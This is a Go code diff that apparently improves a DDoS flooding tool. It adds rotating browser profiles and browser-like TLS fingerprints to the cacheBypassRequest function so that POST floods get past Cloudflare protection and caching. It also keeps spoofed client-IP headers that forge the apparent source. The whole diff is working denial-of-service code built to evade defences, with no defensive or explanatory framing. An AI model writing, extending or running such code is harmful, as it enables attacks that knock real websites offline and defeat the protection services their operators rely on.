@@ -111,6 +111,9 @@ func runCacheBypassFlood(cfg *AttackConfig) {
 }
 
 func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) error {
+	// Rotate browser profile
+	profile := GetRandomProfile()
+	
 	dialer := &net.Dialer{Timeout: 6 * time.Second}
 	rawConn, err := dialer.Dial("tcp", host+":"+port)
 	if err != nil {
@@ -124,10 +127,9 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 
 	var conn net.Conn = rawConn
 	if useTLS {
-		tlsConn := tls.Client(rawConn, &tls.Config{
-			InsecureSkipVerify: true,
-			ServerName:         hostHeader,
-		})
+		// Use browser-specific TLS fingerprint
+		tlsConfig := CreateTLSConfig(profile, hostHeader)
+		tlsConn := tls.Client(rawConn, tlsConfig)
 		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
 		if err := tlsConn.Handshake(); err != nil {
 			return err
@@ -160,20 +162,32 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 	}
 	fullEndpoint := endpoint + separator + cb
 
-	// Build POST request with no-cache headers + IP spoofing
+	// Build POST request with browser-specific headers + Cloudflare bypass
+	clientHints := ""
+	for key, val := range profile.ClientHints {
+		clientHints += fmt.Sprintf("%s: %s\r\n", key, val)
+	}
+
 	req := fmt.Sprintf(
 		"POST %s HTTP/1.1\r\n"+
 			"Host: %s\r\n"+
 			"User-Agent: %s\r\n"+
-			"Accept: text/html,application/json,*/*\r\n"+
-			"Accept-Language: en-US,en;q=0.9\r\n"+
-			"Accept-Encoding: gzip, deflate, br\r\n"+
+			"Accept: %s\r\n"+
+			"Accept-Language: %s\r\n"+
+			"Accept-Encoding: %s\r\n"+
 			"Content-Type: application/x-www-form-urlencoded\r\n"+
 			"Content-Length: %d\r\n"+
 			"Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"+
 			"Pragma: no-cache\r\n"+
 			"Origin: https://%s\r\n"+
 			"Referer: https://%s/\r\n"+
+			"%s"+
+			"Sec-Fetch-Dest: document\r\n"+
+			"Sec-Fetch-Mode: navigate\r\n"+
+			"Sec-Fetch-Site: same-origin\r\n"+
+			"Sec-Fetch-User: ?1\r\n"+
+			"Upgrade-Insecure-Requests: 1\r\n"+
+			"DNT: 1\r\n"+
 			"X-Forwarded-For: %s\r\n"+
 			"X-Real-IP: %s\r\n"+
 			"CF-Connecting-IP: %s\r\n"+
@@ -183,8 +197,10 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 			"X-Forwarded-Host: %s\r\n"+
 			"Connection: close\r\n"+
 			"\r\n%s",
-		fullEndpoint, hostHeader, randomUA(),
+		fullEndpoint, hostHeader, profile.UserAgent,
+		profile.Accept, profile.AcceptLanguage, profile.AcceptEncoding,
 		len(bodyStr), hostHeader, hostHeader,
+		clientHints,
 		randomFakeIP(), randomFakeIP(), randomFakeIP(), randomFakeIP(),
 		randomFakeIP(), randomFakeIP(), hostHeader,
 		bodyStr,
